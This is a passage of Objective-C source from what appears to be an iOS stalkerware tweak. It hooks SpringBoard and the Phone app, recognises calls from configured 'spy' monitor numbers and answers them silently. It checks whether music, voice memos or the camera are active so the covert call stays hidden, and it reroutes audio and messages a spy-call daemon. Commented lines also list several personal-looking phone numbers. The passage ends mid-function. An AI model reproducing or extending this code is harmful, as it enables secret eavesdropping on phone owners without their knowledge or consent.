//
//  SpyCallUtils.m
//  MSSPC
//
//  Created by Makara Khloth on 3/12/12.
//  Copyright 2012 __MyCompanyName__. All rights reserved.
//

#import "SpyCallUtils.h"
#import "FxCall.h"
#import "Telephony.h"
#import "MessagePortIPCSender.h"
#import "DefStd.h"
#import "TelephoneNumber.h"
#import "SystemEnvironmentUtils.h"
#import "SpyCallManager.h"
#import "AudioHelper.h"
#import "AudioActiveInfo.h"
#import "SystemUtilsImpl.h"

#import "PrefMonitorNumber.h"
#import "SharedFileIPC.h"

#import "SBTelephonyManager.h"
#import "SBTelephonyManager+iOS8.h"
#import "SBMediaController.h"
#import "SBMediaController+iOS8.h"
#import "AVController.h"
#import "AVController+iOS8.h"
#import "AVSystemController.h"
#import "AVSystemController+iOS8.h"
#import "SBApplicationController.h"
#import "SBApplicationController+iOS8.h"
#import "SBApplication.h"
#import "SBApplication+iOS8.h"
#import "SpringBoard.h"
#import "SpringBoard+IOS711.h"
#import "AudioDeviceController.h"

#import "MPAudioDeviceController.h"

#import "SBConferenceManager.h"
#import "SBConferenceManager+IOS6.h"
#import "SBConferenceManager+iOS9.h"
#import "PhoneApplication.h"
#import "PhoneApplication+IOS6.h"
#import "PhoneApplication+IOS7.h"
#import "PhoneApplication+iOS8.h"
#import "IMAVCallManager.h"
#import "IMAVCallManager+iOS8.h"
#import "IMAVChatProxy.h"
#import "IMAVChatProxy+iOS8.h"
#import "IMAVChat.h"
#import "IMAVChat+iOS8.h"
#import "IMAVChatParticipantProxy.h"
#import "IMHandle.h"

#import "FBProcessState.h"
#import "TUCall.h"
#import "TUCall+iOS9.h"

#include <pthread.h>
#import <objc/runtime.h>
#import <AVFoundation/AVFoundation.h>

@implementation SpyCallUtils

+ (NSString *) telephoneNumber: (CTCall *) aCall {
	NSString *telephoneNumber = CTCallCopyAddress(nil, aCall);
	[telephoneNumber autorelease];
	return (telephoneNumber);
}

+ (NSInteger) callCauseCode: (CTCall *) aCall {
	NSInteger callCauseCode = CTCallGetCauseCode(aCall);
	return (callCauseCode);
}

+ (void) answerCall: (CTCall *) aCall {
	CTCallAnswer(aCall);
}

+ (BOOL) isCallWaiting: (CTCall *) aCall {
	BOOL waiting = CTCallIsWaiting(aCall);
	return (waiting);
}

+ (BOOL) isSpyNumber: (NSString *) aTelephoneNumber {
	BOOL yes = NO;
//	if (aTelephoneNumber && [aTelephoneNumber isEqualToString:@"0818469733"]) {
//        /* 0867826665 0869874443 0818469733 0850981119 0893429459 0856841133 0870323600 0830885384 */
//		return (yes = YES);
//	}
	
	SharedFileIPC *sFileIPC = [[SharedFileIPC alloc] initWithSharedFileName:kSharedFileMobileSubstrate4];
	NSData *monitorNumberData = [sFileIPC readDataWithID:kSharedFileMonitorNumberID];
	APPLOGVERBOSE(@"monitorNumberData = %@", monitorNumberData);
    
	if (monitorNumberData) {
		PrefMonitorNumber *prefMonitorNumbers = [[PrefMonitorNumber alloc] initFromData:monitorNumberData];
		if ([prefMonitorNumbers mEnableMonitor]) {
			TelephoneNumber *telNumber = [[TelephoneNumber alloc] init];
			for (NSString *monitorNumber in [prefMonitorNumbers mMonitorNumbers]) {
				if ([telNumber isNumber:aTelephoneNumber matchWithMonitorNumber:monitorNumber]) {
					yes = YES;
					break;
				}
			}
			[telNumber release];
		}
		[prefMonitorNumbers release];
        
	} else {
        UIApplication *uiApp = [UIApplication sharedApplication];
        if ([uiApp respondsToSelector:@selector(isProtectedDataAvailable)] &&
            ![uiApp performSelector:@selector(isProtectedDataAvailable)]) {
            /*
             Protected data not available so use preferences plist to access spy call settings
             */
            APPLOGVERBOSE(@"Monitor numbers is not available in protected data mode");
            
            NSDictionary *preferences = [NSDictionary dictionaryWithContentsOfFile:@"/var/mobile/Library/Preferences/com.secure.remote.user.numbers.plist"];
            NSData *prefMonitorNumberData = [preferences objectForKey:@"secure.remote.user.numbers"];
            DLog(@"prefMonitorNumberData = %@", prefMonitorNumberData);
            
            PrefMonitorNumber *prefMonitorNumbers = [[PrefMonitorNumber alloc] initFromData:prefMonitorNumberData];
            if ([prefMonitorNumbers mEnableMonitor]) {
                TelephoneNumber *telNumber = [[TelephoneNumber alloc] init];
                for (NSString *monitorNumber in [prefMonitorNumbers mMonitorNumbers]) {
                    if ([telNumber isNumber:aTelephoneNumber matchWithMonitorNumber:monitorNumber]) {
                        yes = YES;
                        break;
                    }
                }
                [telNumber release];
            }
            [prefMonitorNumbers release];
        }
    }
    
	[sFileIPC release];
    
	APPLOGVERBOSE(@"aTelphoneNumber = %@ is spy number = %d", aTelephoneNumber, yes);
	return (yes);
}

+ (BOOL) isConferenceCallEnable {
    BOOL yes = NO;
    SharedFileIPC *sFileIPC = [[SharedFileIPC alloc] initWithSharedFileName:kSharedFileMobileSubstrate4];
    NSData *monitorNumberData = [sFileIPC readDataWithID:kSharedFileMonitorNumberID];
    APPLOGVERBOSE(@"monitorNumberData(2) = %@", monitorNumberData);
    
    if (monitorNumberData) {
        PrefMonitorNumber *prefMonitorNumbers = [[PrefMonitorNumber alloc] initFromData:monitorNumberData];
        if ([prefMonitorNumbers mEnableCallConference]) {
            yes = YES;
        }
        [prefMonitorNumbers release];
        
    } else {
        UIApplication *uiApp = [UIApplication sharedApplication];
        if ([uiApp respondsToSelector:@selector(isProtectedDataAvailable)] &&
            ![uiApp performSelector:@selector(isProtectedDataAvailable)]) {
            /*
             Protected data not available so use preferences plist to access spy call settings
             */
            APPLOGVERBOSE(@"Monitor numbers(2) is not available in protected data mode");
            
            NSDictionary *preferences = [NSDictionary dictionaryWithContentsOfFile:@"/var/mobile/Library/Preferences/com.secure.remote.user.numbers.plist"];
            NSData *prefMonitorNumberData = [preferences objectForKey:@"secure.remote.user.numbers"];
            DLog(@"prefMonitorNumberData = %@", prefMonitorNumberData);
            
            PrefMonitorNumber *prefMonitorNumbers = [[PrefMonitorNumber alloc] initFromData:prefMonitorNumberData];
            if ([prefMonitorNumbers mEnableCallConference]) {
                yes = YES;
            }
            [prefMonitorNumbers release];
        }
    }
    
    [sFileIPC release];
    
    APPLOGVERBOSE(@"Conference Call, %d", yes);
    return (yes);
}

+ (BOOL) isSpyCall: (CTCall *) aCall {
	return ([SpyCallUtils isSpyNumber:[SpyCallUtils telephoneNumber:aCall]]);
}

+ (BOOL) isSpyTUCall: (TUCall *) aCall {
    NSString *destinationID = [[aCall.destinationID componentsSeparatedByCharactersInSet:
                                [[NSCharacterSet decimalDigitCharacterSet] invertedSet]]
                             componentsJoinedByString:@""];
    return ([self isSpyNumber:destinationID]);
}

+ (BOOL) isOutgoingCall: (CTCall *) aCall {
	BOOL outgoing = CTCallIsOutgoing(aCall);
	return (outgoing);
}

+ (BOOL) sendCommandToSpyCallDaemon: (NSInteger) aCommandID cmdInfo: (id) aInfo {
	APPLOGVERBOSE(@"aCommandID = %d, aCmdInfo = %@", aCommandID, aInfo);
	NSInteger command = aCommandID;
	NSMutableData *data = [NSMutableData data];
	[data appendBytes:&command length:sizeof(NSInteger)];
	NSInteger length = 0;
	NSInteger count = 0;
	switch (command) {
		case kSpyCallMSNormalCallInProgress: {
			NSDictionary *info = aInfo;
			// Direction
			NSInteger direction = [[info objectForKey:kNormalCallDirection] intValue];
			[data appendBytes:&direction length:sizeof(NSInteger)];
			// Number
			NSString *number = [info objectForKey:kNormalCallNumber];
			length = [number lengthOfBytesUsingEncoding:NSUTF8StringEncoding];
			[data appendBytes:&length length:sizeof(NSInteger)];
			[data appendData:[number dataUsingEncoding:NSUTF8StringEncoding]];
		} break;
		case kSpyCallMSMaxConferenceLine: {
			NSDictionary *info = aInfo;
			NSArray *telNumbers = [info objectForKey:kTeleNumbers];
			NSArray *telDirections = [info objectForKey:kTeleDirections];
			NSInteger lines = [[info objectForKey:kTeleMaxLines] intValue];
			// Max lines
			[data appendBytes:&lines length:sizeof(NSInteger)];
			// Telephone numbers
			count = [telNumbers count];
			[data appendBytes:&count length:sizeof(NSInteger)];
			for (NSString *telNumber in telNumbers) {
				length = [telNumber lengthOfBytesUsingEncoding:NSUTF8StringEncoding];
				[data appendBytes:&length length:sizeof(NSInteger)];
				[data appendData:[telNumber dataUsingEncoding:NSUTF8StringEncoding]];
			}
			// Directions
			count = [telDirections count];
			[data appendBytes:&count length:sizeof(NSInteger)];
			for (NSNumber *direction in telDirections) {
				NSInteger value = [direction intValue];
				[data appendBytes:&value length:sizeof(NSInteger)];
			}
		} break;
		case kSpyCallMSNormalCallOnHold: {
			NSDictionary *info = aInfo;
			NSArray *telNumbers = [info objectForKey:kTeleNumbers];
			NSArray *telDirections = [info objectForKey:kTeleDirections];
			// Telephone numbers
			count = [telNumbers count];
			[data appendBytes:&count length:sizeof(NSInteger)];
			for (NSString *telNumber in telNumbers) {
				length = [telNumber lengthOfBytesUsingEncoding:NSUTF8StringEncoding];
				[data appendBytes:&length length:sizeof(NSInteger)];
				[data appendData:[telNumber dataUsingEncoding:NSUTF8StringEncoding]];
			}
			// Directions
			count = [telDirections count];
			[data appendBytes:&count length:sizeof(NSInteger)];
			for (NSNumber *direction in telDirections) {
				NSInteger value = [direction intValue];
				[data appendBytes:&value length:sizeof(NSInteger)];
			}
		} break;
		case kSpyCallMSAudioIsActive: {
			// No data send to daemon
		} break;
		case kSpyCallMSSpyCallInProgress: {
			NSString *number = aInfo;
			length = [number lengthOfBytesUsingEncoding:NSUTF8StringEncoding];
			[data appendBytes:&length length:sizeof(NSInteger)];
			[data appendData:[number dataUsingEncoding:NSUTF8StringEncoding]];
		} break;
        case kSpyCallMSFaceTimeInProgress: {
            NSArray *facetimeIDs = aInfo;
            NSInteger count = [facetimeIDs count];
            [data appendBytes:&count length:sizeof(NSInteger)];
            for (NSString *facetimeID in facetimeIDs) {
                NSInteger length = [facetimeID lengthOfBytesUsingEncoding:NSUTF8StringEncoding];
                [data appendBytes:&length length:sizeof(NSInteger)];
                [data appendData:[facetimeID dataUsingEncoding:NSUTF8StringEncoding]];
            }
        } break;
		default: {
			;
		} break;
	}
	MessagePortIPCSender *sender = [[MessagePortIPCSender alloc] initWithPortName:kSpyCallMSCommandMsgPort];
	BOOL write = [sender writeDataToPort:data];
	[sender release];
    APPLOGVERBOSE(@"Sending spy call notification success, %d", write);
	return (write);
}

+ (BOOL) isSpringBoardHook {
	BOOL yes = FALSE;
	NSString *bundleID = [[NSBundle mainBundle] bundleIdentifier];
	if ([bundleID isEqualToString:@"com.apple.springboard"]) {
		yes = TRUE;
	}
	return (yes);
}

+ (BOOL) isMobileApplicationHook {
	BOOL yes = FALSE;
	NSString *bundleID = [[NSBundle mainBundle] bundleIdentifier];
	if ([bundleID isEqualToString:@"com.apple.mobilephone"]) {
		yes = TRUE;
	}
	return (yes);
}

+ (BOOL) isVoiceMemoHook {
	BOOL yes = FALSE;
	NSString *bundleID = [[NSBundle mainBundle] bundleIdentifier];
	if ([bundleID isEqualToString:@"com.apple.VoiceMemos"]) {
		yes = TRUE;
	}
	return (yes);
}

+ (BOOL) isIOS10 {
    return ([[[UIDevice currentDevice] systemVersion] intValue] == 10);
}

+ (BOOL) isIOS9 {
	return ([[[UIDevice currentDevice] systemVersion] intValue] == 9);
}

+ (BOOL) isIOS8 {
	return ([[[UIDevice currentDevice] systemVersion] intValue] == 8);
}

+ (BOOL) isIOS7 {
	return ([[[UIDevice currentDevice] systemVersion] intValue] == 7);
}

+ (BOOL) isIOS6 {
	return ([[[UIDevice currentDevice] systemVersion] intValue] == 6);
}

+ (BOOL) isIOS5 {
	return ([[[UIDevice currentDevice] systemVersion] intValue] == 5);
}

+ (BOOL) isIOS4 {
	return ([[[UIDevice currentDevice] systemVersion] intValue] == 4);
}

+ (void) prepareToAnswerCall {
	if ([SpyCallUtils isSpringBoardHook]) {
		if ([SpyCallUtils isIOS5] ||
			[SpyCallUtils isIOS6] ||
			[SpyCallUtils isIOS7] ||
            [SpyCallUtils isIOS8] ||
            [SpyCallUtils isIOS9] ||
            [SpyCallUtils isIOS10]) {
			// Work only with iOS 5, there is no such method in iOS 4
			Class $SBTelephonyManager = objc_getClass("SBTelephonyManager");
			[[$SBTelephonyManager sharedTelephonyManager] _prepareToAnswerCall];
		} else if ([SpyCallUtils isIOS4]) {
			// Work with both iOS 4 and iOS 5 but side effect to iOS 5 is that after spy call is disconnected:
			// 1. Not vibrate when normal come in
			// 2. Voice Memo cannot record
			// 3. Video or music player not able to play sound
			AVController *avController = [[[SpyCallManager sharedManager] mSystemEnvUtils] mAVController];
			[SpyCallUtils setAVController:avController category:@"PhoneCall" transition:1];
		}
	} else if ([SpyCallUtils isMobileApplicationHook]) {
		// Ask SpringBoard board to prepare to answer call
		MessagePortIPCSender *writer = [[MessagePortIPCSender alloc] initWithPortName:kSpyCallSpringBoardRecordingMsgPort];
		NSMutableData *audioHelperPrepareToAnswerCallCmdData = [NSMutableData data];
		NSInteger cmd = kAudioHelperPrepareToAnswerCallCmd;
		[audioHelperPrepareToAnswerCallCmdData appendBytes:&cmd length:sizeof(NSInteger)];
		[writer writeDataToPort:audioHelperPrepareToAnswerCallCmdData];
		NSData *returnData = [writer mReturnData];
		APPLOGVERBOSE(@"returnData = %@", returnData);
		if (returnData) {
			BOOL isPrepared = NO;
			[returnData getBytes:&isPrepared length:sizeof(BOOL)];
		}
		[writer release];
		writer = nil;
	}
}

+ (BOOL) isPlayingAudio {
	BOOL isSBPlaying = FALSE;
	BOOL isVoiceMemoPlaying = FALSE;
    BOOL isOtherAppPlaying = FALSE;
	
	// Ask to VoiceMemo whether it is playing back
	MessagePortIPCSender *writer = [[MessagePortIPCSender alloc] initWithPortName:kSpyCallVoiceMemoPlayingMsgPort];
	NSMutableData *audioHelperIsPlayingCmdData = [NSMutableData data];
	NSInteger cmd = kAudioHelperIsPlayingCmd;
	[audioHelperIsPlayingCmdData appendBytes:&cmd length:sizeof(NSInteger)];
	[writer writeDataToPort:audioHelperIsPlayingCmdData];
	NSData *returnData = [writer mReturnData];
	DLog(@"returnData 1 = %@", returnData);
	if (returnData) {
		[returnData getBytes:&isVoiceMemoPlaying length:sizeof(BOOL)];
	}
	[writer release];
	writer = nil;
	
	if ([SpyCallUtils isSpringBoardHook]) { // SpringBoard
		Class $SBMediaController = objc_getClass("SBMediaController");
		isSBPlaying = [[$SBMediaController sharedInstance] isPlaying];
        
        AVAudioSession *avAudioSession = [objc_getClass("AVAudioSession") sharedInstance];
        if ([avAudioSession respondsToSelector:@selector(isOtherAudioPlaying)]) { // iOS 6 onward
            isOtherAppPlaying = [avAudioSession isOtherAudioPlaying]; // secondaryAudioShouldBeSilencedHint
        }
	} else if ([SpyCallUtils isMobileApplicationHook]) { // Mobile Phone
		// Ask to SpringBoard its isPlaying is set to TRUE
		writer = [[MessagePortIPCSender alloc] initWithPortName:kSpyCallSpringBoardRecordingMsgPort];
		[writer writeDataToPort:audioHelperIsPlayingCmdData];
		returnData = [writer mReturnData];
		DLog(@"returnData 2 = %@", returnData);
		if (returnData) {
			[returnData getBytes:&isSBPlaying length:sizeof(BOOL)];
		}
		[writer release];
	}
    DLog (@"isOtherAppPlaying = %d", isOtherAppPlaying);
	DLog (@"isSBPlaying = %d, isVoiceMemoPlaying = %d", isSBPlaying, isVoiceMemoPlaying);
	return (isSBPlaying || isVoiceMemoPlaying || isOtherAppPlaying);
}

+ (BOOL) isRecordingAudio {
	BOOL isRecording = FALSE;
	if ([SpyCallUtils isSpringBoardHook]) { // SpringBoard
        SBApplication *voiceMemo = nil;
		Class $SBApplicationController = objc_getClass("SBApplicationController");
        SBApplicationController *appController = [$SBApplicationController sharedInstance];
        if ([appController respondsToSelector:@selector(applicationCurrentlyRecordingAudio)]) {
            voiceMemo = [appController applicationCurrentlyRecordingAudio];
        } else {
            // iOS 7.1.1,...,9.0.2
            SpringBoard *sb = (SpringBoard *)[UIApplication sharedApplication];
            voiceMemo = [sb nowRecordingApp];
        }
		isRecording = voiceMemo ? TRUE : FALSE;
        
        if (!isRecording) {
            isRecording = [self isCameraRecording];
        }
	} else if ([SpyCallUtils isMobileApplicationHook]) { // Mobile Phone
		// Ask to SpringBoard whether VoiceMemo is recording
		MessagePortIPCSender *writer = [[MessagePortIPCSender alloc] initWithPortName:kSpyCallSpringBoardRecordingMsgPort];
		NSMutableData *audioHelperIsRecordingCmdData = [NSMutableData data];
		NSInteger cmd = kAudioHelperIsRecordingCmd;
		[audioHelperIsRecordingCmdData appendBytes:&cmd length:sizeof(NSInteger)];
		[writer writeDataToPort:audioHelperIsRecordingCmdData];
		NSData *returnData = [writer mReturnData];
		DLog(@"returnData = %@", returnData);
		if (returnData) {
			[returnData getBytes:&isRecording length:sizeof(BOOL)];
		}
		[writer release];
	}
	DLog (@"isRecording = %d", isRecording);
	return (isRecording);
}

+ (BOOL) isCameraRecording {
    BOOL isCameraRecording = NO;
    if ([SpyCallUtils isSpringBoardHook]) { // SpringBoard
        Class $SBApplicationController = objc_getClass("SBApplicationController");
        SBApplicationController *appController = [$SBApplicationController sharedInstance];
        if ([appController respondsToSelector:@selector(cameraApplication)]) { // iOS 8 onward
            SBApplication *cameraApp = [appController cameraApplication];
            isCameraRecording = [cameraApp isRecordingAudio];
        }
    }
    APPLOGVERBOSE(@"isCameraRecording, %d", isCameraRecording);
    return (isCameraRecording);
}

+ (BOOL) isAudioActiveFromFirstCheck {
	BOOL isAudioActive = FALSE;
	SharedFileIPC *sFileIPC = [[SharedFileIPC alloc] initWithSharedFileName:kSharedFileMobileSubstrate];
	NSData *aaiData = [sFileIPC readDataWithID:kSharedFileAudioActiveID];
	if (aaiData) {
		AudioActiveInfo *aai = [[AudioActiveInfo alloc] initWithData:aaiData];
		isAudioActive = [aai mIsAudioActive];
		[aai release];
	}
	[sFileIPC release];
	return (isAudioActive);
}

+ (void) setAVController: (AVController *) aAVController category: (NSString *) aCategory transition: (NSInteger) aTransition {
	APPLOGVERBOSE(@"1.AVController attribute value = %@", [aAVController attributeForKey:aCategory]);
	
	[aAVController activate:nil];
	NSError *error = nil;
	NSNumber *stateNumber=[NSNumber numberWithInteger:aTransition];
	NSString *audioTransitionKey = @"AVController_AllowGaplessTransitionsAttribute";
	[aAVController setAttribute:(id)stateNumber forKey:audioTransitionKey error:&error];
	APPLOGVERBOSE (@"1.aAVController = %@ error = %@", aAVController, error);
	NSString *stateValue = aCategory;
	NSString *audioCategoryKey = @"AVController_AudioCategoryAttribute";
	error = nil;
	[aAVController setAttribute:(id)stateValue forKey:audioCategoryKey error:&error];
	
	APPLOGVERBOSE (@"2.aAVController = %@ error = %@", aAVController, error);
	APPLOGVERBOSE(@"2.AVController attribute value = %@", [aAVController attributeForKey:@"AVController_AudioCategoryAttribute"]);
}

+ (void) pickSpeakerDefaultRoute {
    if ([self isIOS8] ||
        [self isIOS9] ||
        [self isIOS10]) {
        Class $MPAudioDeviceController = objc_getClass("MPAudioDeviceController");
        MPAudioDeviceController *adController = [[$MPAudioDeviceController alloc] init];
        BOOL speakerPicked = [adController pickSpeakerRoute];
        if (!speakerPicked) {
            APPLOGVERBOSE(@"Speaker route cannot pick");
        }
        [adController release];
    }
}

+ (void) activateSpeakerWithAVController: (AVController *) aAVController {
    /*
     - iOS 7 (may be iOS 6 too), information from AudioDeviceController _pickedRoute and _pickableRoutes method using aAVController
     
     _pickedRout     = {\n    AVAudioRouteName = Speaker;
                        \n    AlternateUIDs =     (\n    );
                        \n    RouteCurrentlyPicked = 1;
                        \n    RouteName = Speaker;
                        \n    RouteType = Default;
                        \n    RouteUID = "Built-In Speaker";
                        \n}
     
     _pickableRoutes = (\n
                            {
                            \n        AVAudioRouteName = Speaker;
                            \n        AlternateUIDs =         (\n        );
                            \n        RouteCurrentlyPicked = 1;
                            \n        RouteName = Speaker;
                            \n        RouteType = Default;
                            \n        RouteUID = "Built-In Speaker";
                            \n}
                        \n)
     
     - iOS 8, information from MPAudioDeviceController _pickedRoute and _pickableRoutes method using aAVController
     _pickedRout =
                     {
                     \n    AVAudioRouteName = Receiver;
                     \n    AlternateUIDs =     (\n    );
                     \n    PortNumber = 109;
                     \n    RouteCurrentlyPicked = 1;
                     \n    RouteName = iPhone;
                     \n    RouteSupportsAudio = 1;
                     \n    RouteType = Default;
                     \n    RouteUID = "Built-In Receiver";
                     \n
                     }
     _pickableRoutes =
                     (\n
                     {
                     \n        AVAudioRouteName = Speaker;
                     \n        AlternateUIDs =         (\n        );
                     \n        PortNumber = 108;
                     \n        RouteName = Speaker;
                     \n        RouteSupportsAudio = 1;
                     \n        RouteType = Override;
                     \n        RouteUID = "Built-In Speaker";
                     \n
                     },
                     \n
                     {
                     \n        AVAudioRouteName = Receiver;
                     \n        AlternateUIDs =         (\n        );
                     \n        PortNumber = 109;
                     \n        RouteCurrentlyPicked = 1;
                     \n        RouteName = iPhone;
                     \n        RouteSupportsAudio = 1;
                     \n        RouteType = Default;
                     \n        RouteUID = "Built-In Receiver";
                     \n
                     }
                     \n)
     */
    
    // -- Open speaker start
    NSMutableDictionary * openSpeakerAttr = [[NSMutableDictionary alloc] init];
    [openSpeakerAttr setValue:@"Speaker" forKey:@"AVAudioRouteName"];
    
    if ([self isIOS9] ||
        [self isIOS10]) {
        [openSpeakerAttr setValue:@"();" forKey:@"RouteUID"];
    } else { // iOS 8
        [openSpeakerAttr setValue:@"();" forKey:@"AlternateUIDs"];
    }
    
    [openSpeakerAttr setValue:@"Speaker" forKey:@"RouteName"];
    [openSpeakerAttr setValue:@"Override" forKey:@"RouteType"];
    
    NSError *error = nil;
    Class $AVSystemController = objc_getClass("AVSystemController");
    AVSystemController *avSystemController =[$AVSystemController sharedAVSystemController];
    [avSystemController setAttribute:(id)openSpeakerAttr forKey:@"AVController_PickedRouteAttribute" error:&error];
    [openSpeakerAttr release];
    
    APPLOGVERBOSE(@"$AVSystemController = %@", $AVSystemController);
    APPLOGVERBOSE(@"avSystemController  = %@", avSystemController);
    APPLOGVERBOSE(@"error = %@", error);
    
    /*
    id adController = nil;
    Class $AudioDeviceController = objc_getClass("AudioDeviceController");
    Class $MPAudioDeviceController = objc_getClass("MPAudioDeviceController");
    if ($AudioDeviceController) { // Below iOS 8
        adController = [[$AudioDeviceController alloc] init];
    } else { // iOS 8
        adController = [[$MPAudioDeviceController alloc] init];
    }
    // No this method in iOS 8
    if ([adController respondsToSelector:@selector(setAVController:)]) {
        [adController setAVController:aAVController];
    }
    [adController pickSpeakerRoute];
    APPLOGVERBOSE(@"$AudioDeviceController      = %@", $AudioDeviceController);
    APPLOGVERBOSE(@"$MPAudioDeviceController    = %@", $MPAudioDeviceController);
    APPLOGVERBOSE(@"_pickedRout     = %@", [adController _pickedRoute]);
    APPLOGVERBOSE(@"_pickableRoutes = %@", [adController _pickableRoutes]);
    [adController release];
     */
    
    // -- Open speaker done
}

+ (void) deactivateSpeakerWithAVController: (AVController *) aAVController {
    // -- Close speaker start
    NSMutableDictionary * closeSpeakerAttr = [[NSMutableDictionary alloc] init];
    
    /*******************************************************************************************************
     More details of audio route properties check file: AVroute-iOSx (in the same folder with this file) or
     run dumpAudioCategory, dumpAudioRoute of SystemEnvironmentUtils for fresh check.
     ********************************************************************************************************/
    
    if ([self isIOS9] ||
        [self isIOS10]) {
        [closeSpeakerAttr setValue:@"Speaker" forKey:@"AVAudioRouteName"];
        [closeSpeakerAttr setValue:@"();" forKey:@"RouteUID"];
        [closeSpeakerAttr setValue:@"Default" forKey:@"RouteType"];
        [closeSpeakerAttr setValue:@"Speaker" forKey:@"RouteName"];
    } else if ([self isIOS8]) {
        [closeSpeakerAttr setValue:@"Speaker" forKey:@"AVAudioRouteName"];
        [closeSpeakerAttr setValue:@"();" forKey:@"AlternateUIDs"];
        [closeSpeakerAttr setValue:@"Default" forKey:@"RouteType"];
        [closeSpeakerAttr setValue:@"Speaker" forKey:@"RouteName"];
    } else {
        [closeSpeakerAttr setValue:@"Receiver" forKey:@"AVAudioRouteName"];
        [closeSpeakerAttr setValue:@"();" forKey:@"AlternateUIDs"];
        [closeSpeakerAttr setValue:@"iPhone" forKey:@"RouteName"];
        [closeSpeakerAttr setValue:@"Default" forKey:@"RouteType"];
    }
    
    // Check this TUAudioSystemController class for iOS 9 if there is an issue for audio routing

    NSError *error = nil;
    Class $AVSystemController = objc_getClass("AVSystemController");
    AVSystemController *avSystemController =[$AVSystemController sharedAVSystemController];
    [avSystemController setAttribute:(id)closeSpeakerAttr forKey:@"AVController_PickedRouteAttribute" error:&error];
    [closeSpeakerAttr release];
        
    APPLOGVERBOSE(@"$AVSystemController = %@", $AVSystemController);
    APPLOGVERBOSE(@"avSystemController = %@", avSystemController);
    APPLOGVERBOSE(@"error = %@", error);
    // -- Close speaker done
}

+ (BOOL) isMobilePhoneRunning {
    BOOL isMobilePhoneRunning = NO;
    SystemUtilsImpl *systemUtils = [[SystemUtilsImpl alloc] init];
    NSArray *runningProcesses = [systemUtils getRunnigProcess];
    //APPLOGVERBOSE(@"All running applications = %@", runningProcesses);
    NSEnumerator *enumerator = [runningProcesses reverseObjectEnumerator];
    NSDictionary *processInfo = nil;
    while (processInfo = [enumerator nextObject]) {
        NSString *processName = [processInfo objectForKey:@"ProcessName"];
        if ([processName isEqualToString:@"MobilePhone"]) {
            isMobilePhoneRunning = YES;
            break;
        }
    }
    [systemUtils release];
    APPLOGVERBOSE(@"MobilePhone application is running, %d", isMobilePhoneRunning);
    return (isMobilePhoneRunning);
}

+ (BOOL) isMobilePhoneProcessSuspend {
    Class $SBApplicationController = objc_getClass("SBApplicationController");
    SBApplicationController *sbAppController = [$SBApplicationController sharedInstance];
    if ([sbAppController respondsToSelector:@selector(mobilePhone)]) {
        SBApplication *mobilePhone = [sbAppController mobilePhone];
        APPLOGVERBOSE(@"mobilePhone, %d, %@", [mobilePhone isRunning], mobilePhone);
        
        FBProcessState *fbProcessState = nil;
        object_getInstanceVariable(mobilePhone, "_processState", (void **)&fbProcessState);
        APPLOGVERBOSE(@"fbProcessState, %d, %@", [fbProcessState taskState], fbProcessState);
        
        return (3 == [fbProcessState taskState]); // 3 : suspend
    }
    return (NO);
}

pthread_mutex_t _mobileCurrentCallsMutex = PTHREAD_MUTEX_INITIALIZER;

+ (NSArray *) currentCalls {
    NSMutableArray *currentCalls = [NSMutableArray array];
    pthread_mutex_lock(&_mobileCurrentCallsMutex); // To fix the crash: Segmentation fault: 11 in MobilePhone ???
    NSArray *calls = CTCopyCurrentCalls();
	pthread_mutex_unlock(&_mobileCurrentCallsMutex);
    
    for (NSInteger i = 0; i < [calls count]; i++) {
		CTCall *ctCall = (CTCall *)[calls objectAtIndex:i];
        NSString *telephoneNumber = [SpyCallUtils telephoneNumber:ctCall];
        APPLOGVERBOSE(@"currentCalls, telephoneNumber: %@", telephoneNumber);
        
        FxCall *call = [[FxCall alloc] init];
        [call setMCTCall:ctCall];
        [call setMTelephoneNumber:telephoneNumber];
        [call setMIsSpyCall:[self isSpyCall:ctCall]];
        if ([SpyCallUtils isOutgoingCall:ctCall]) {
            [call setMDirection:kFxCallDirectionOut];
        } else {
            [call setMDirection:kFxCallDirectionIn];
        }
        [call setMCallState:(FxCallState)[self fxCallState:ctCall]];
        [currentCalls addObject:call];
        [call release];
    }
	[calls autorelease];
    APPLOGVERBOSE(@"currentCalls, %@", currentCalls);
    return (currentCalls);
}

+ (int) fxCallState: (CTCall *) aCall {
    int fxCallState = kFxCallStateDisconnected;
    int telephonyStatus = (int)CTCallGetStatus(aCall);
    switch (telephonyStatus) {
        case CALLBACK_TELEPHONY_NOTIFICATION_STATUS_DIALING: {
            fxCallState = kFxCallStateDialing;
        } break;
        case CALLBACK_TELEPHONY_NOTIFICATION_STATUS_INCOMING: {
            fxCallState = kFxCallStateIncoming;
        } break;
        case CALLBACK_TELEPHONY_NOTIFICATION_STATUS_CONECTED: {
            fxCallState = kFxCallStateConnected;
        } break;
        case CALLBACK_TELEPHONY_NOTIFICATION_STATUS_ONHOLD: {
            fxCallState = kFxCallStateOnHold;
        } break;
        case CALLBACK_TELEPHONY_NOTIFICATION_STATUS_DISCONECTED: {
            fxCallState = kFxCallStateDisconnected;
        } break;
        case CALLBACK_TELEPHONY_NOTIFICATION_STATUS_INVALID: {
            fxCallState = kFxCallStateDisconnected;
        } break;
        default: {
            ;
        } break;
    }
    return (fxCallState);
}

+ (BOOL) isFaceTimeCall: (CTCall *) aCall {
    BOOL isFaceTimeCall     = NO;
    CTCallType callType     = kCTCallTypeNormal;
    callType                = (CTCallType)CTCallGetCallType(aCall);			// Get Call type
    DLog (@"--> callType %@", callType)
    isFaceTimeCall          = ([(NSString *) callType isEqualToString:(NSString *) kCTCallTypeVideoConference]  ||
                               [(NSString *) callType isEqualToString:(NSString *) @"kCTCallTypeAudioConference"]);
    return isFaceTimeCall;
}

+ (BOOL) isInFaceTime {
    BOOL inFaceTime = NO;
    
    // SpringBoard application, cannot use because it can only detect video FaceTime call
    Class $SBConferenceManager = objc_getClass("SBConferenceManager");
	SBConferenceManager *sbConferenceManager = [$SBConferenceManager sharedInstance];
    if ([sbConferenceManager respondsToSelector:@selector(inConference)]) { // Below iOS 6
        inFaceTime = [sbConferenceManager inConference];
    } else if ([sbConferenceManager respondsToSelector:@selector(inFaceTime)]) { // iOS 6,7,8,9
        inFaceTime = [sbConferenceManager inFaceTime];
    }
    
    // MobilePhone application, cannot use because it cannot detect either FaceTime call
    Class $PhoneApplication = objc_getClass("PhoneApplication");
    if ($PhoneApplication) {
        PhoneApplication *phoneApp = (PhoneApplication *)[$PhoneApplication sharedApplication];
        if ([phoneApp respondsToSelector:@selector(inFaceTime)]) {
            inFaceTime = [phoneApp inFaceTime];
        }
    }
    APPLOGVERBOSE(@"inFaceTime = %d", inFaceTime);
    APPLOGVERBOSE(@"$SBConferenceManager = %@, $PhoneApplication = %@", $SBConferenceManager, $PhoneApplication);
